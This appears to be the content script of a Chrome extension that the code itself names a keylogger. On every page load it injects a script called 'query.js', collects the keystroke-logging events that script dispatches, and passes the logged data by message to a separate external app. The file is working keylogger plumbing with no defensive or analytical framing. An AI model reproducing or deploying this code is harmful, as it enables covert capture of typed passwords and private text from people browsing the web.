var __config = {
    dispatchID: '__LauraKeyLoggerExtension',
    
    __debug__: true
};

// ***** do not edit below this line ****** //

// Applcation IDs, used for message passing
var __appID = {
    app: "opfpjfjicecfggophkmacanbphmfigja",
    ext: "cciecdfdfbhkbheicoebjblaehbaifgb"
}

// Debugging function. Set to false __config.__debug__ to 
// avoid messages in console
function __printDebug(message) {
	if (__config.__debug__) { console.log(message); }
}

// Return time in human readable format
function __time() {
    var d = new Date();
    return d.toLocaleString();
}

// Object that will contain the logging informations
var keylog = null;


// function that inject query.js in every new document
function injectKeylogger() {
    var s = document.createElement('script');
    s.src = chrome.extension.getURL('query.js');
    (document.head||document.documentElement).appendChild(s);
    s.onload = function() {
        s.parentNode.removeChild(s);
    };
}

// ***** MAIN *****
// Insert keylogger at each document onload event
document.onload = injectKeylogger();

// creating the connection to the external app. The connection
// will be recreated each time an event is fired. Before re-initialize connection
// the event will try to understand if connection already exists
var port = null;

function connectExternalApp() {
    if (!port) { 
        port = chrome.runtime.connect(__appID.app);
        port.postMessage({
           protocol: "log",
           content: "[" + __time() + " :: EXT] Establishing Connection. If you see this message the connection is established"
        });
        // null the port when connection disconnects
        port.onDisconnect.addListener(function() {
            port = null;
        });
    }
}

// Event listener. This event listener will send message to app using
// chrome.runtime.port message passing architecture
document.addEventListener(__config.dispatchID, function(e) {
    
    // keylog is an abject that contains all the logging informations
    // passed from the injected script
    keylog = e.detail;
    //__printDebug(keylog);
    
    connectExternalApp();
    port.postMessage({
        protocol: "event",
        content: keylog
    })
    
});
